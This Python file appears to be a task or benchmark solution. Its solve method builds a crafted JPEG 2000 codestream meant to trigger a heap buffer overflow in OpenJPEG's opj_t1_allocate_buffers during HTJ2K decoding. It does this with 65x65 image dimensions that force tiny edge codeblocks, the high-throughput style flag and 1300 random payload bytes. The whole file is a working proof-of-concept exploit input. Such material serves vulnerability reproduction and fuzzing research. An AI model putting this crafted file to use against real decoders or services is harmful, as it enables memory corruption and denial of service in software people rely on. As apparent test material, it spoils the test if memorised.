import struct
import random

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow in opj_t1_allocate_buffers (HT_DEC).
        The vulnerability involves insufficient memory allocation for HTJ2K decoding on small/edge codeblocks.
        """
        # 1. Start of Codestream (SOC)
        data = bytearray(b'\xff\x4f')
        
        # 2. Image and Tile Size (SIZ)
        # We define an image of 65x65. With a code block size of 64x64 (defined in COD),
        # this forces the creation of 1x1 code blocks at the bottom-right edge (and 1x64, 64x1).
        # These small blocks combined with HTJ2K mode trigger the allocation issue.
        width = 65
        height = 65
        tile_w = 65
        tile_h = 65
        
        # Rsiz=0, W=65, H=65, XOff=0, YOff=0, TileW=65, TileH=65, TileXOff=0, TileYOff=0, Comps=1
        siz_params = struct.pack('>HIIIIIIIIH', 0, width, height, 0, 0, tile_w, tile_h, 0, 0, 1)
        # Component 0: Bitdepth=8 (0x07), dx=1, dy=1
        siz_params += b'\x07\x01\x01'
        
        data += b'\xff\x51' + struct.pack('>H', len(siz_params) + 2) + siz_params
        
        # 3. Coding Style Default (COD)
        # Scod=0
        # SGcod: Order=0, Layers=1, MCT=0
        # SPcod: Levels=0 (Simple)
        #        xcb=4 (Width = 2^(4+2) = 64)
        #        ycb=4 (Height = 2^(4+2) = 64)
        #        style=0x40 (Enables HTJ2K / High Throughput mode) -> KEY TRIGGER
        #        transform=0
        cod_params = struct.pack('>BBHBBBBBB', 0, 0, 1, 0, 0, 4, 4, 0x40, 0)
        
        data += b'\xff\x52' + struct.pack('>H', len(cod_params) + 2) + cod_params
        
        # 4. Quantization Default (QCD)
        # Sqcd=0x20 (Scalar derived), LL band exponent/mantissa=0
        qcd_params = b'\x20\x00'
        data += b'\xff\x5c' + struct.pack('>H', len(qcd_params) + 2) + qcd_params
        
        # 5. Start of Tile (SOT)
        # Isot=0, Psot=0 (Auto), TPsot=0, TNsot=1
        sot_params = struct.pack('>HIBB', 0, 0, 0, 1)
        data += b'\xff\x90' + struct.pack('>H', len(sot_params) + 2) + sot_params
        
        # 6. Start of Data (SOD)
        data += b'\xff\x93'
        
        # 7. Payload
        # Provide random data to act as packet headers/body.
        # We need enough entropy to trigger the code block inclusion in the packet header parsing,
        # which subsequently calls opj_t1_allocate_buffers and the HT decoding routine.
        rng = random.Random(42)
        payload = bytearray([rng.randint(0, 255) for _ in range(1300)])
        data += payload
        
        # 8. End of Codestream (EOC)
        data += b'\xff\xd9'
        
        return bytes(data)